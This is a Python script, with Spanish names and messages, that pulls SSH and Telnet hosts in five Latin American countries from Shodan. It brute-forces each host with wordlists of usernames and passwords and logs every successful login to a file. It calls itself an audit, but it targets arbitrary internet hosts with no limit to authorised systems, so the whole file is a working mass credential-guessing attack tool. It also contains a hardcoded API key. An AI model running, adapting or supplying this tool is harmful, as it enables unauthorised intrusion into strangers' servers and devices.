import shodan
import socket
import asyncio
import telnetlib3
import paramiko
import logging
from datetime import datetime

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

API_KEY = 'WMTqOFxBYrRPgqJaXmFbWuERTKBBXaWA'
MAX_IPS_TOTAL = 100
PAISES = ['MX', 'AR', 'CO', 'CL', 'PE']
MODO_SILENCIOSO = False

print_gui = None  # Variable para imprimir en GUI si está disponible

def log(mensaje):
    if print_gui:
        print_gui(f"{mensaje}\n")
    if not MODO_SILENCIOSO:
        print(mensaje)

def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def cargar_lista(archivo):
    with open(archivo, 'r') as f:
        return [line.strip() for line in f.readlines()]

usuarios = cargar_lista('usuarios.txt')
passwords = cargar_lista('passwords.txt')

def cargar_ips_probadas():
    try:
        with open('lista_ips.txt', 'r') as f:
            return set(line.strip().split(" ")[2] for line in f.readlines())
    except FileNotFoundError:
        return set()

def guardar_resultado(ip, puerto, usuario, contrasena):
    protocolo = "SSH" if puerto == 22 else "TELNET"
    with open('lista_ips.txt', 'a') as f:
        f.write(f"{timestamp()} {protocolo} - {ip} ({usuario}/{contrasena})\n")

def probar_ssh(ip):
    for usuario in usuarios:
        for contrasena in passwords:
            try:
                cliente = paramiko.SSHClient()
                cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                cliente.connect(ip, port=22, username=usuario, password=contrasena, timeout=3)
                log(f"{timestamp()} [+] SSH VULNERABLE: {ip} - {usuario}:{contrasena}")
                guardar_resultado(ip, 22, usuario, contrasena)
                cliente.close()
                return True
            except:
                continue
    return False

async def probar_telnet(ip):
    for usuario in usuarios:
        for contrasena in passwords:
            try:
                reader, writer = await telnetlib3.open_connection(
                    ip, port=23, login_prompt='login:', password_prompt='Password:', timeout=3
                )
                await writer.login(usuario, contrasena)
                log(f"{timestamp()} [+] TELNET VULNERABLE: {ip} - {usuario}:{contrasena}")
                guardar_resultado(ip, 23, usuario, contrasena)
                writer.close()
                return True
            except:
                continue
    return False

def buscar_ips():
    api = shodan.Shodan(API_KEY)
    ips = []
    ya_escaneadas = cargar_ips_probadas()
    max_por_puerto = MAX_IPS_TOTAL // 2

    for puerto in [22, 23]:
        cantidad_actual = 0
        for pais in PAISES:
            if cantidad_actual >= max_por_puerto:
                break
            try:
                query = f'port:{puerto} country:{pais}'
                resultados = api.search(query, limit=max_por_puerto * 2)
                log(f"[+] {len(resultados['matches'])} resultados para {pais} puerto {puerto}")

                for servicio in resultados['matches']:
                    ip = servicio['ip_str']
                    if ip in ya_escaneadas or (ip, puerto) in ips:
                        continue
                    ips.append((ip, puerto))
                    cantidad_actual += 1
                    if cantidad_actual >= max_por_puerto:
                        break

            except Exception as e:
                log(f"[!] Error en {pais} puerto {puerto}: {e}")

    log(f"[+] Total de IPs recolectadas: {len(ips)}")
    return ips

async def ejecutar_auditoria():
    async def tarea_principal():
        log("[*] Buscando IPs...")
        ips_encontradas = buscar_ips()
        log(f"[+] {len(ips_encontradas)} IPs encontradas.")
        for ip, puerto in ips_encontradas:
            log(f"{timestamp()} [*] Probando {'SSH' if puerto == 22 else 'TELNET'} en {ip}")
            if puerto == 22:
                probar_ssh(ip)
            elif puerto == 23:
                await probar_telnet(ip)

    try:
        await asyncio.wait_for(tarea_principal(), timeout=180)
    except asyncio.TimeoutError:
        log(f"{timestamp()} [!] Tiempo límite alcanzado (3 minutos). Finalizando auditoría...")

if __name__ == '__main__':
    asyncio.run(ejecutar_auditoria())
